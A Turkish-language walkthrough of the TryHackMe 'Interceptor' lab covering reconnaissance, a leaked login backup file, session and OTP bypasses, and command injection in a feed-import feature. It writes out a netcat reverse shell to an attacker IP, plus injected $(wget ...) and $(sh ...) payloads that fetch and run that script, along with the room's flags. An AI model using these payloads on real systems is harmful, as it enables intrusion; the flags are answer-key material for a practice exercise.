# TryHackMe - Interceptor Writeup

## Keşif

İlk olarak nmap taraması ile başlıyoruz:

```bash
nmap -sS -A -p- 10.112.165.37
```
<img width="826" height="610" alt="nmap" src="https://github.com/user-attachments/assets/965f4008-65f8-4b1b-8145-94acbfacbe42" />

Taramada **22, 80, 53** portlarının açık olduğunu gördüm. 22 ve 53 şimdilik işe yarar görünmüyordu, o yüzden direkt web tarafına yöneldim. Siteye gittiğimde karşımda sade bir login sayfası vardı, başka bir şey görünmüyordu.

<img width="1919" height="440" alt="loginsite" src="https://github.com/user-attachments/assets/4d9a8ca2-93e8-4856-8f77-be3c561a2394" />

---

## Dizin Taraması

Login olmadan erişebileceğim bir şey var mı diye ffuf ile dizin taraması denedim:

```bash
ffuf -u http://10.112.165.37/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Ama garip bir şey oldu — denediğim her dizin **200 OK** dönüyordu. Bu genelde bir wildcard response olduğunun işareti, yani sunucu var olmayan her dizin için de aynı sayfayı döndürüyor. Bunu doğrulamak için rastgele bir dizine (`/test`) curl attım ve dönen response'un uzunluğunun **1491** olduğunu gördüm. Demek ki bu, "bulunamadı" sayfasının sabit boyutuydu. ffuf'a bu boyuttaki response'ları filtrelemesini söyledim:

```bash
ffuf -u http://10.112.165.37/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 1491
```

Bu sefer gerçek sonuçlar geldi:

<img width="1122" height="497" alt="ffuf" src="https://github.com/user-attachments/assets/067aaec8-5f0a-4920-aae1-7f0d35d7bc63" />

Ama bir tuhaflık vardı: listede `login.php` yoktu, oysa siteyi ziyaret ettiğimde bir login sayfası görmüştüm. Demek ki normal wordlist bunu yakalayamıyordu. Bunun üzerine taramayı dosya uzantılarına göre genişlettim — belki dosyanın kendisi değil, bir yedeği/eski hali duruyordu:

```bash
ffuf -u http://10.112.165.37/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 1491 -e .php,.php.bak,.php.old,.php.save,.php.swp,.php~,,.bak,.old,.orig,.save,.swp,.log,.conf,.config,.sql,.sql.bak,.sql.old,.tar,.tar.gz,.tgz,.zip,.7z
```

Bu sefer **`login.php.bak`** dosyasını buldum. Bu, geliştiricinin production'a almayı unuttuğu bir yedek dosyaydı.

<img width="774" height="259" alt="ffuf2" src="https://github.com/user-attachments/assets/e1d49275-58fe-406d-8dd8-68f130cd3bda" />

---

## Backup Dosyası Sızıntısı

`login.php.bak` dosyasına giderek indirdim ve içeriğini okudum:

```bash
cat login.php.bak
```
<img width="785" height="324" alt="loginphpbak" src="https://github.com/user-attachments/assets/aa587298-8285-4008-b0d0-95270dbe416f" />

Bu not bana iki şey verdi: admin hesabının **e-posta adresi** ve şirketin parola formatı hakkında bir ipucu. Parolayı tahmin etmeye çalışmadan önce, elimdeki daha zayıf halkayı denemeye karar verdim.

---

## Burp Suite ile Auth Bypass

<img width="752" height="434" alt="request" src="https://github.com/user-attachments/assets/4ba7b1f5-8446-45ab-a63c-9a720ba104de" />

Login sayfasına elimdeki e-posta ile bir istek gönderip Burp ile yakaladım. İsteği incelerken, session/cookie bilgisini isteğin üzerinden silip tekrar gönderdim. Beklenmedik şekilde sunucu şu cevabı döndü:

<img width="771" height="400" alt="response" src="https://github.com/user-attachments/assets/a3815cab-55bc-48ae-b281-7c9e2177ad41" />

Yani kimlik doğrulama, cookie olmadan da "başarılı" dönebiliyordu — bu da uygulamanın session kontrolünde ciddi bir mantık hatası olduğunu gösteriyordu. Yönlendirilen `otp.php` sayfasına gittim:

```
http://10.112.165.37/otp.php
```

Karşıma **Two Factor Verification** ekranı çıktı, 6 haneli bir kod istiyordu.

<img width="1919" height="573" alt="otpsite" src="https://github.com/user-attachments/assets/8e39e6b3-75f8-4b2a-b44e-347b82d19f10" />

---

## OTP Bypass

OTP alanına rastgele bir değer (`111111`) girip isteği Burp üzerinden yakaladım:

Sunucudan gelen orijinal response şuydu:

<img width="1543" height="396" alt="request2" src="https://github.com/user-attachments/assets/0fc9fea3-8059-4828-ba19-384b186204a2" />

Burada dikkatimi çeken şey, response içinde dönen is_verified alanının aynı zamanda istek (request) tarafında da bir parametre adı olarak kullanılabileceği ihtimaliydi. Yani sunucu, bu alana sadece response'ta bilgi amaçlı yer vermiyordu — muhtemelen OTP doğrulama mantığında is_verified diye bir parametreyi client'tan geliyormuş gibi de kabul ediyordu.

Bunu test etmek için Burp'te isteği yakaladım ve form-data içine, orijinalde olmayan yeni bir alan ekledim:

<img width="1518" height="305" alt="request3" src="https://github.com/user-attachments/assets/ea26fdad-fd9c-4298-8962-9e145afc34e8" />

<img width="1919" height="678" alt="firstflag" src="https://github.com/user-attachments/assets/3aa7db7b-97c9-4d23-b026-52c12320f9f0" />

```
flag: THM{ADMIN_ACCESS_USING_BURP}
```
---

## Import Feed - Command Injection ile Shell

Panelde **"Import Feed"** adında bir özellik vardı:

```
Paste a valid RSS/Atom feed URL. The server fetches it and returns the raw output.
If the server has no internet, you'll see: Internet not connected.
```

Yani bu özellik, verdiğim URL'yi sunucu tarafında çekip sonucu bana gösteriyordu. Bu tarz "sunucu senin adına bir URL'ye istek atsın" özellikleri her zaman command injection ihtimaline karşı test etmeye değer.

Önce kendi makinemde bir reverse shell script'i hazırladım:

```bash
nano shell.sh
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.154.242 4444 >/tmp/f
```
<img width="1108" height="599" alt="shelloluşturma" src="https://github.com/user-attachments/assets/5a906e49-5efe-4379-834a-8ce4e5e77485" />

Sonra bunu hedefin erişebileceği şekilde kendi makinemde servis olarak yayınladım:

```bash
python3 -m http.server 8000
```

Feed URL alanına, sunucunun bu script'i indirmesini sağlayacak bir **command substitution** payload'ı verdim:

```
http://$(wget http://192.168.154.242:8000/shell.sh)
```
<img width="1560" height="697" alt="shellgönderildi" src="https://github.com/user-attachments/assets/40fb62fe-3bb9-4629-b696-a50e3a1a956c" />


Sayfa `curl: (3) URL using bad/illegal format or missing URL` hatası döndürse de, bu aslında normaldi — çünkü `$()` içindeki komut zaten çalışmış ve `shell.sh` dosyası hedef sunucuya inmişti. Hata mesajı sadece geri kalan URL'nin curl tarafından reddedilmesinden kaynaklanıyordu.

Ardından indirilen dosyayı çalıştırmak için aynı yöntemi tekrar kullandım:

```
http://$(sh shell.sh)
```

Bu istek gönderildiğinde listener tarafında reverse shell'i yakaladım.

<img width="1570" height="640" alt="shell alındı" src="https://github.com/user-attachments/assets/eade1ec3-b816-4e14-aa71-ae76b258f022" />

---

## Flag

Görev, `/var/www/user.txt` dosyasının içeriğini bulmamı istiyordu. Shell üzerinden dosyayı okudum:

```bash
cat /var/www/user.txt
```

```
THM{SYSTEM_PWNED_SUCCESSFULLY}
```

<img width="624" height="502" alt="flag2" src="https://github.com/user-attachments/assets/1ffdf3a1-2cc4-4d83-99b6-189ee25d5598" />
